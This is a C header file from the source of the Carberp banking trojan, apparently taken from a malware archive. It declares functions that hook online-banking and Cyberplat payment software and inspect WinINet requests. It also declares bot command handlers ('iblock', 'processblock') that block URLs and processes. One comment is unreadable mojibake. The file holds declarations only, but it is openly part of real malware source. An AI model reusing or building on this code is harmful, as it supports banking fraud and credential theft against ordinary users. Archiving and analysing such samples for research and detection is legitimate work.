/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#ifndef RuBnkH
#define RuBnkH
//----------------------------------------------------------------------------
#include <windows.h>
#include <wininet.h>


void IsBank( HINTERNET hRequest);
bool IbankHooksMain();
bool HookCyberplatPCMain();
const char Iblock_Url[] = "iblock\0";
const char Iblock_processblock[] = "processblock\0";///���������� �������� ������ ���� � ��� ������� ������ ������� � ��� 
bool ExecuteIblock_Url(LPVOID Manager, PCHAR Command, PCHAR Args);
bool ExecuteIblock_processblock(LPVOID Manager, PCHAR Command, PCHAR Args);
DWORD WINAPI IBlockThread(LPVOID lpData);

//----------------------------------------------------------------------------
#endif
